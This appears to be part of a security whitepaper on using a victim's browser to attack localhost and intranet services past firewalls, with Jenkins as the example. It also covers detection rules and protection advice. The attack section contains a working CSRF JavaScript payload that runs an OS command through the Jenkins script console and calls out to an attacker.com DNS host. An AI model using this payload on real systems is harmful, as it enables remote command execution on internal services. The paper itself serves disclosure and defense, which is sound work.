Typically, people attempt to configure public facing servers securely, but often neglect the security of internal servers. This oversight is often even more pronounced with local services, with the (flawed) rationale that the host-based firewall prevents access to it. Therefore, there is a good chance that the found Jenkins instance is configured insecurely. With this in mind, let’s prepare an attack assuming the Jenkins instance is not configured with CSRF protection.

> Note: We are not releasing any Jenkins zero-day, the insecure configuration we take advantage of is a known issue (in a non-default configuration) \[23\]. We could have picked any vulnerability, but decided to use Jenkins as an illustrative example.

### Technique for verification of blind command injection via DNS

For brevity, and to avoid the details of establishing a persistent presence on the victim, let’s settle for verifying that an injected command actually runs. A simple way to verify command injection that almost always works in a blind injection scenario is to have the victim make a DNS query that will be resolved by a DNS server in the attacker’s control. In our setup, we have control over the DNS servers for the domain attacker.com. Therefore, let’s inject the following command into the Jenkins script console: host abc123.attacker.com. By looking in the DNS query logs, we can simply verify from our position outside the target network that the OS command actually ran.

> Note: This verification is not dependent on the victim being able to directly access the DNS servers for the attacker.com domain. Instead, what happens is this: when the victim runs the JavaScript, Jenkins will run the OS command, which will cause a DNS query to be sent to the internal DNS server of the victim, which will in turn forward it, and it will eventually get to the authoritative DNS server of the attacker.com domain. (Essentially, the only way to block this would be to prevent DNS lookups completely, something which is rarely feasible.)

### Performing the attack and verifying it
Our malicious HTML/JavaScript that attacks Jenkins looks like this:

```html
<html>
<head>
<script>
request = new XMLHttpRequest();
request.open('POST', 'http://127.0.0.1:8080/script');
// Ensure that any Jenkins cookies will be added by the browser: request.withCredentials = true;
request.setRequestHeader("Content-Type","application/x-www-form-urlencoded") request.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8") 
var params =
'script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%2 9%0D%0Adef+proc+%3D+%27host abc123.attacker.com%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22%0D%0A&Submit=Run'; 
request.send(params); 
request.onload = function() {
    var bytes = request.response; 
    alert('Received from service: ' + bytes);
};
</script>
<body> Testing page
</body>
</html>
```

When the victim surfs to our malicious page (that resides, remember, on the public Internet, not the internal network), we can see in the DNS logs for the attacker.com domain:

```
05-	Mar-2019 13:25:01.079 queries: info: client <redacted IP address>#42960 (abc123.attacker.com): query: abc123.attacker.com IN AAAA -E(0)DC (<redacted IP address>)
```

Seeing this DNS entry proves to us that our injected command ran successfully on the victim!

> Note: In practice, a real attacker would likely rather execute some command that fetches and runs some code that sets up a Command & Control (C2) channel between the victim and the attacker. For the purpose of this whitepaper, however, we limited ourselves to just proving command injection.

## Brief attack chain analysis

Stepping back, looking at the full picture, we find that we were able to both find and compromise a vulnerable service running on the internal network, all while sitting on the public Internet, and all in face of SOP. By using the victim’s browser as a proxy, we were able to completely bypass both the corporate firewall and the host-based firewall in the process.

Furthermore, no vulnerability in the code was needed to pull off this attack. Every step of the attack relied on things working as intended (apart from our deliberate configuration issue in Jenkins resulting in it being exposed to CSRF). This in turn means that patching your firewall, browser and Jenkins to the latest versions would not protect against the attack. (The proper protection against our example attack would be to configure Jenkins to a more secure setting.)

The demonstration of how to ‘surf’ the intranet indeed relied on an XSS vulnerability, but that was unrelated to the compromise of Jenkins.
 
From a defensive perspective, a positive thing to point out is that for a real attacker, carrying out a real attack against a specific target, most (but not all) attack payloads will fail, for two reasons:

1.	Since the attacker is effectively blind due to SOP, his only feedback will be vague inferences of what the victim’s internal network looks like. With so little visibility, apart from the edge case we showed of how to surf the intranet, it is hard to mount a successful attack.
2.	Since the victim cannot be relied upon for staying on the malicious page for very long, it will be hard for the attacker to adjust the attack based on information about the internal network that could be inferred. (As mentioned earlier, attackers sometimes use adult material to entice victims to stay long enough on a page.)

To solve both of these problems, increasing the chances of a successful attack, the attacker may make generic attacks against a large number of services at once (as opposed to attacking only Jenkins like we did). The attacker may in advance prepare a malicious web page that contains JavaScript for performing a large amount of different kinds of attacks against assorted services that are commonly found on the internal network, such as Jenkins on a developer’s workstation, exploits for several different routers, etc. Though the majority of attacks will fail, given a sufficiently large pool of victims, some of the attacks will succeed, and that may be good enough from the attacker’s point of view.

## Detection of suspicious behavior indicating a local attack

The most efficient place to implement detection/protection for these attacks would likely be in the browser itself. Since browsers do not fully protect us, and since only browser vendors have control over browser feature roadmaps, the next best option for the rest of us may be to surf through a web proxy that can normalize/deobfuscate malicious code and detect and prevent these attacks.

In the absence of a web proxy (or more secure browser defaults) that can protect us, we should aim for at least being able to detect these attacks. A saying within the security community says “prevention is ideal, but detection is a must”. This equally applies to the local attacks we have discussed.

For detection purposes, the biggest red flag is if an externally hosted JavaScript/web page attempts to connect to private IP addresses. We can detect this suspicious behavior using network traffic analysis techniques, though this approach in isolation will also give some false positives.

Let’s start out simple and later refine our detection. An initial, rather simplistic, model for detecting the case where an externally hosted JavaScript compromises an internal server that in turn calls home to a C2 could be:
*	Make a trigger that alerts if the following events happen in a fairly rapid succession, on the order of minutes, and in this order: workstation W connects to public site P1, then W contacts internal server S, then S contacts P2 on the public Internet.
*	The level of suspicion should be further increased if any of the following conditions hold true: P1 and P2 are the same hosts, P1 and P2 are not within Alexa top 1M sites \[24\], P1 or P2 are hosted on a free hosting site, P1 or P2 use Dynamic DNS.

Note that depending on the network infrastructure, connections between an internal workstation (W above) and some internal server (S above) will not necessarily go through the firewall, and connections from an internal workstation to localhost does not generate network traffic at all. Therefore, if the organization has a SIEM or similar centralized log management solution, it may be good to look for these suspicious behaviors in the SIEM as opposed to only in the firewall. Implementing this in the SIEM requires that the logs sent to the SIEM contain enough level of details about connections.

Due to the risk of false positives, detection of the chain of events described above might not merit automatic blocking/alerting on its own. Together with additional indicators it may go across the threshold for blocking, however. To improve detection accuracy, we may add other parts of the attack chain to our detection rules:
*	A connection to an external web server followed by a burst of DNS requests for one’s own domain (where most lookups fail) from the same workstation may be an indication of a malicious JavaScript attempting to find hosts on the internal network.
*	A connection to an external web server followed by a large number of outgoing connections to many different hosts on the internal network (for some common HTTP ports such as 80, 443, 8080) may be an indication of a malicious JavaScript making a port scan.
*	A connection to an external web server followed by a large number of outgoing HTTP requests to the internal network that give HTTP/404 in response may be an indication of a malicious JavaScript fingerprinting services found on open ports.

More options are available for detection purposes if not limiting ourselves to solely doing network traffic analysis. For example, an endpoint agent could potentially provide intelligence to a network security device (for example a firewall) about what web page generated a certain request, greatly augmenting the decision making capabilities of the network security device.

## Protection

How can you protect yourself against these local attacks? There is no silver bullet for complete protection, but there are still many small things you can do to decrease your attack surface.

### Recommendations for protection for people in different roles

**For a typical home user**, the single most important thing you can do is to apply any new patches for your home router. Also, you may want to consider changing the router’s IP address to something else than the default (which is often 192.168.0.1 or 192.168.1.1). Be wary of shady sites in general. Attackers are known for presenting adult material on malicious pages as a bait \[25\]. In the context of local attacks, adult material may entice the victim to stay on the site long enough for the attacker to perform an attack against the internal network.

**For developers**, the most important thing you can do is to ensure that your software is resistant against CSRF attacks. Starting guides for implementing CSRF protection can be found on the Internet \[26\].
Also, developers often need to run assorted services that normal users don’t, such as databases, Jenkins, etc. Ensure that those services are not vulnerable to CSRF attacks, and that they are configured securely in general. (Secure configuration of these services is arguably even more important than having the latest patch installed. In this author’s experience with penetration testing, it is more common that you are able to compromise a system as a result of an insecure configuration than as a result of a missing patch.)
 
**Network administrators**, IT product managers and developers need to be aware that neither a host- based firewall nor a perimeter firewall is enough to fully prevent remote exploitation. Even services running on localhost or the internal network may be attacked via malicious JavaScript loaded from the public Internet, and these services must therefore be adequately protected. In particular, the services need to be resistant against CSRF attacks. Also, when doing threat modelling, take into account that also local/internal services can receive external input that’s potentially malicious.

**For corporate users**, it is worthwhile to surf through a web proxy that can detect and block these local attacks.

**For security research** purposes, there may sometimes be a need for deliberately visiting shady sites, such as malware sites, underground criminal forums, etc. When visiting such sites, surfing from a virtual machine is recommended.

**Web developers** should be aware of the fact that if the same origin is shared between different subdomains, an XSS vulnerability on one domain may spill over to the other domain and allow not only writing requests, but also reading (i.e. surfing) by the attacker. Only share origins if there is a real need for doing so, and ensure that you do not share origins between external and internal web servers.

**For scenarios where privacy is paramount** and the TOR network is used for communication, ensure that you do not change the default configuration of not allowing the browser connect to localhost and the local LAN. Allowing connections to the local network could potentially be used to de-anonymize a TOR user, for example by doing a CSRF request to a vulnerable router, asking it to make a ping request to some external site, thereby revealing the public IP address.

**For end-users** in general: use authentication even for services running on localhost/internally (especially for HTTP/HTTPS interfaces), preferably multi-factor authentication (MFA) when possible, or else set a strong password. Logout from the service when you are done using it: even if strong authentication is required, the service may be attacked if the victim is currently logged on to it when surfing to a malicious site, and the service in question is vulnerable to CSRF.

As a final note, turning off JavaScript in your browser is not a sufficient protection against local attacks, since some CSRF attacks can be performed using a simple GET request (normal HTTP link) or using an HTML form, not requiring any JavaScript.

### Ensure that your application cannot attack other applications

While CSRF protection aims at ensuring that your application cannot be successfully attacked, another measure is needed for ensuring that your application cannot attack other applications (for example via some XSS vulnerability). A good measure for this is Content Security Policy (CSP), which will thwart many attacks against localhost/internal network. CSP is a whitelisting approach that allows you to configure what hosts your application is allowed to communicate with. Several good introductions to CSP can be found online \[27\].
 
Why do you even need to care about ensuring that your application cannot attack other applications by adding CSP headers? If an attacker finds, for example, some XSS vulnerability in your site, he can take advantage of the victim’s trust in your site and inject some JavaScript that carries out an attack against localhost/internal network unless CSP blocks him from doing so.

Note though, that CSP is not 100% watertight: for example, redirections using HTTP 302/Location HTTP header will not honor the CSP configuration. Additional examples of bypassing CSP rules exist as well
\[28] \[29] \[30\]. For this reason, CSP alone does not give a perfect protection, though it does make attacks significantly more difficult.

### Final words on protection
We recognize that it may not be practical in all situations to address all the recommendations described above, perhaps due to limited resources, browser defaults, or a vendor not providing a fix to a vulnerable appliance. For these situations, our recommendation is to implement detection at the very least.

## Conclusions

*We have shown a chain of attacks that can all be made from the public Internet, even in face of a firewall: via a victim browser you can look for hosts and open ports on the internal network, fingerprint the open ports and finally exploit them. The only security issue needed for this attack chain to work is that the service to exploit is vulnerable to CSRF*. Other than that, every step of the attack relies on things working as intended.

In addition to describing the technical details of these attacks, we have discussed ways of detecting them as well as given recommendations for decreasing one’s attack surface.

It is clearly a problem that modern web browsers do not provide better protection against attacks originating from the public Internet that use the victim’s browser as a proxy for accessing the internal network. Further, using the victim’s browser as a proxy will bypass not only the perimeter firewall, but also any host-based firewall. Fetching of the malicious JavaScript from an external site may be logged by the firewall, but subsequent attacks against the internal network will not even go through the perimeter firewall.

Browser vendors should consider disallowing connections crossing the public/private IP boundary by default, in the direction from public to private. (The opposite direction must be allowed though, since many internal pages may fetch external resources for perfectly valid reasons.)

Vendors of network security devices (firewall, IPS, web proxy, etc) should have a solid JavaScript deobfuscation engine to assist in detecting these attacks. Obfuscation of malicious code changes frequently in many cases, whereas the underlying intent of the code does not. Therefore, detection of connections from public to private IP addresses can be done much more reliably against the deobfuscated version of the malicious code.
 
Local attacks via a remote cross-origin JavaScript represent an often neglected attack surface, and corporate users and home users alike are at risk of local attacks. Most home routers have had CSRF vulnerabilities, are rarely up-to-date on patching, and they typically use a known, fixed IP address – properties that make them easy to target.

On the positive side, local attacks require not only technical preparations, but also an element of social engineering. The victim needs to be tricked into visiting some malicious site that can perform a local attack. Unfortunately though, history shows that attackers often have a quite high success rate of tricking victims into visiting malicious sites.

Also, we showed how an attacker may surf some site on the internal network if external and internal web servers share the same origin.

As final words, we want to underscore that the attacks we have shown in this whitepaper should make a case for improving the security of the internal network, both for servers and for workstations.
Circumventing SOP for reconnaissance purposes, edge case of surfing the intranet, and compromising internal services via CSRF all highlight the fact that the security of internal applications must be taken seriously. Even if you trust your users not to attack you, your own users are not your only concern.

In addition to technical measures for detection and protection outlined earlier, education of administrators and end-users is needed, specifically underscoring that internal security is important. As we have shown, it is a flawed assumption that a perimeter firewall completely protects the internal network, and that a host-based firewall completely protects local services.
 

## Resources
\[1\]: https://www.slideshare.net/netsparker/hacking-vulnerable-websites-to-bypass-firewalls

\[2\]: https://blog.beefproject.com/2014/03/exploiting-with-beef-bind-shellcode_19.html

\[3\]: https://bugs.chromium.org/p/project-zero/issues/detail?id=1663

\[4\]: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Cross- origin_network_access

\[5\]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

\[6\]: https://en.wikipedia.org/wiki/DNS_rebinding

\[7\]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)

\[8\]: https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html

\[9\]: https://www.secforce.com/blog/2012/11/inter-protocol-communication/

\[10\]: https://en.wikipedia.org/wiki/Inter-protocol_exploitation

\[11\]: https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2018/cprf-1.pdf

\[12\]: https://chromium.googlesource.com/chromium/src/+/master/net/base/port_util.cc

\[13\]: https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html

\[14\]: http://net.ipcalf.com/

\[15\]: https://defuse.ca/in-browser-port-scanning.htm

\[16\]: https://github.com/aabeling/portscan

\[17\]: https://github.com/SkyLined/LocalNetworkScanner/

\[18\]: https://blog.skylined.nl/LocalNetworkScanner/

\[19\]: https://cirt.net/Nikto2

\[20\]: http://yokoso.inguardians.com

\[21\]: https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Changing_origin

\[22\]: https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password

\[23\]: https://groups.google.com/forum/#!topic/jenkinsci-advisories/lJfvDs5s6bk

\[24\]: http://s3.amazonaws.com/alexa-static/top-1m.csv.zip

\[25\]: https://www.foxnews.com/tech/hackers-using-porn-as-bait-for-online-scams-that-steal-your-data- and-money-by-the-second

\[26\]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-
Site_Request_Forgery_Prevention_Cheat_Sheet.md

\[27\]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

\[28\]: https://blog.compass-security.com/2016/06/content-security-policy-misconfigurations-and- bypasses/

\[29\]: https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack%20In%20Bo%20-
%20So%20we%20broke%20all%20CSPs...%20You%20won%27t%20guess%20what%20happened%2 0next%21.pdf

\[30\]: https://html5sec.org/minichallenges/3



